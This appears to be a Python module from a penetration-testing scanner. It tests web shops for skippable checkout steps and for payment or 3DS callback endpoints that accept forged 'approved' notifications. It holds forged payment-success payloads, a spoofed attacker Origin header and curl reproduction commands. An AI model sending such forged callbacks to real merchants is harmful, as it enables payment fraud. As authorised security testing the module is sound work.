"""Workflow Bypass — skip steps in multi-step processes."""
from __future__ import annotations
import sys, time
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))
from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity
import aiohttp

CVSS = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
CVSS40 = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N"

# Common multi-step workflows
CHECKOUT_STEPS = [
    ["/cart", "/checkout/shipping", "/checkout/payment", "/checkout/confirm", "/checkout/complete"],
    ["/basket", "/order/address", "/order/payment", "/order/review", "/order/submit"],
    ["/api/cart", "/api/checkout/step1", "/api/checkout/step2", "/api/checkout/submit"],
]

CVSS_CALLBACK   = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
CVSS40_CALLBACK = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N"

# Payment/3DS callback paths — probe for origin-validation bypass
PAYMENT_CALLBACK_PATHS = [
    "/mcredirect",
    "/payment/callback", "/payment/result", "/payment/notify", "/payment/success",
    "/3ds/callback",     "/3ds/result",
    "/checkout/callback", "/checkout/complete", "/checkout/success",
    "/api/payment/callback", "/api/payment/result", "/api/3ds/callback",
]

# Forged success payloads covering Mastercard 3DS and generic PSP schemas
FORGED_CALLBACK_PAYLOADS: list[dict] = [
    {"resultCode": "000", "resultDescription": "Approved", "transactionId": "FORGE_TEST_1234"},
    {"status": "success", "transactionId": "FORGE_TEST_1234", "amount": "0.01"},
    {"payment_status": "PAID", "order_id": "FORGE_TEST_1234"},
    {"result": "success", "transaction_id": "FORGE_TEST_1234"},
    {"ResponseCode": "00", "ReasonCode": "00", "OrderID": "FORGE_TEST_1234"},
]

CALLBACK_SUCCESS_INDICATORS = [
    "success", "approved", "payment_success", "order_confirmed",
    "thank you", "thankyou", "confirmation", "complete", "paid",
]

class WorkflowBypass(BaseModule):
    NAME = "workflow_bypass"
    DESCRIPTION = "Business Logic: bypass multi-step workflows by skipping to final step"
    PHASE = 9
    TAGS = ["business-logic", "workflow", "cwe-841"]

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        target = self.config.target.rstrip("/")
        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        async with aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(ssl=False),
            timeout=aiohttp.ClientTimeout(total=10),
        ) as session:
            bypasses = []

            for workflow in CHECKOUT_STEPS:
                # Check if workflow exists
                first_exists = False
                await self.rate_limit()
                try:
                    async with session.get(f"{target}{workflow[0]}") as resp:
                        if resp.status in (200, 301, 302):
                            first_exists = True
                except Exception:
                    pass

                if not first_exists:
                    continue

                # Try skipping directly to final steps
                for step in workflow[-2:]:
                    await self.rate_limit()
                    try:
                        # Direct GET to final step
                        async with session.get(f"{target}{step}") as resp:
                            body = await resp.text(errors="ignore")
                            if resp.status == 200 and len(body) > 200:
                                if "redirect" not in body.lower()[:100] and "login" not in body.lower()[:100]:
                                    bypasses.append({
                                        "workflow": " → ".join(workflow),
                                        "skipped_to": step,
                                        "method": "GET",
                                    })
                    except Exception:
                        pass

                    # Direct POST to final step
                    await self.rate_limit()
                    try:
                        async with session.post(f"{target}{step}", data={"submit": "1"}) as resp:
                            body = await resp.text(errors="ignore")
                            if resp.status == 200 and "error" not in body.lower()[:200]:
                                bypasses.append({
                                    "workflow": " → ".join(workflow),
                                    "skipped_to": step,
                                    "method": "POST",
                                })
                    except Exception:
                        pass

            if bypasses:
                ev = Evidence(extra={"bypasses": bypasses[:10]})
                self.new_finding(
                    title=f"Workflow Bypass — {len(bypasses)} step(s) skippable",
                    severity=Severity.HIGH,
                    description=(
                        f"Multi-step workflow bypass detected:\n"
                        + "\n".join(
                            f"  {b['method']} {b['skipped_to']} (skipped: {b['workflow'][:60]})"
                            for b in bypasses[:5])
                    ),
                    reproduction_steps=[
                        f"# Skip to final step: curl -X POST {target}{bypasses[0]['skipped_to']}",
                    ],
                    remediation="Enforce step completion server-side. Validate each step was completed.",
                    references=["CWE-841", "OWASP Business Logic"],
                    evidence=ev, cvss_v31_vector=CVSS, cvss_v40_vector=CVSS40,
                    target=target)

            await self._test_payment_callback(session, target)

        return self._make_result(start)

    async def _test_payment_callback(
        self, session: aiohttp.ClientSession, target: str
    ) -> None:
        """Probe payment/3DS callback endpoints for origin-validation bypass.

        POSTs forged 'approved' payloads from an attacker-controlled Origin to
        detect handlers that trust the POST body without verifying HMAC/signature
        or querying the PSP API (e.g. Mastercard 3DS mcredirect with validation
        logic commented out — as seen in the Bakong/NBC engagement, CRIT-5).
        """
        for path in PAYMENT_CALLBACK_PATHS:
            url = f"{target}{path}"
            await self.rate_limit()
            try:
                async with session.head(url, allow_redirects=False) as probe:
                    if probe.status not in (200, 405, 301, 302):
                        continue
            except Exception:
                continue

            for payload in FORGED_CALLBACK_PAYLOADS:
                await self.rate_limit()
                try:
                    async with session.post(
                        url,
                        data=payload,
                        headers={
                            "Origin":       "https://gateway.attacker.com",
                            "Referer":      "https://gateway.attacker.com/3ds/result",
                            "Content-Type": "application/x-www-form-urlencoded",
                        },
                        allow_redirects=True,
                    ) as resp:
                        body       = await resp.text(errors="ignore")
                        body_lower = body.lower()
                        hits       = [i for i in CALLBACK_SUCCESS_INDICATORS if i in body_lower]
                        if resp.status in (200, 302) and hits:
                            ev = Evidence(
                                request_raw=(
                                    f"POST {url}\n"
                                    "Origin: https://gateway.attacker.com\n\n"
                                    + "&".join(f"{k}={v}" for k, v in payload.items())
                                ),
                                response_raw=body[:400],
                                extra={
                                    "callback_path":         path,
                                    "forged_payload":        payload,
                                    "response_status":       resp.status,
                                    "success_indicators":    hits,
                                },
                            )
                            self.new_finding(
                                title=f"Payment Callback Forgery — No Origin Validation ({path})",
                                severity=Severity.CRITICAL,
                                description=(
                                    f"The payment callback endpoint {url} accepted a forged "
                                    "'approved' notification from an attacker-controlled Origin "
                                    "without validating the request source or HMAC signature. "
                                    "An attacker can POST a fabricated payment success to "
                                    "complete orders without real payment — financial fraud."
                                ),
                                reproduction_steps=[
                                    f"curl -X POST {url} \\",
                                    "  -H 'Origin: https://gateway.attacker.com' \\",
                                    "  -d '" + "&".join(f"{k}={v}" for k, v in payload.items()) + "'",
                                    f"Observe: HTTP {resp.status} with success indicator in body",
                                ],
                                remediation=(
                                    "Verify payment callbacks via HMAC-SHA256 signature from the PSP. "
                                    "Confirm status by calling the PSP inquiry API — "
                                    "never trust outcome from the POST body alone. "
                                    "Allowlist PSP callback IP ranges as a secondary control."
                                ),
                                references=["CWE-345", "CWE-284", "OWASP A04:2021"],
                                evidence=ev,
                                cvss_v31_vector=CVSS_CALLBACK,
                                cvss_v40_vector=CVSS40_CALLBACK,
                                mitre_attack=["TA0040/T1565", "TA0009/T1190"],
                                target=target,
                                url=url,
                            )
                            return
                except Exception:
                    pass

class TestWorkflowBypass:
    def test_phase(self) -> None: assert WorkflowBypass.PHASE == 9

    def test_payment_callback_paths(self) -> None:
        assert "/mcredirect" in PAYMENT_CALLBACK_PATHS
        assert "/3ds/callback" in PAYMENT_CALLBACK_PATHS
        assert len(PAYMENT_CALLBACK_PATHS) >= 5

    def test_forged_payloads(self) -> None:
        assert any("resultCode" in p for p in FORGED_CALLBACK_PAYLOADS)
        assert any("status" in p for p in FORGED_CALLBACK_PAYLOADS)
        assert any("payment_status" in p for p in FORGED_CALLBACK_PAYLOADS)
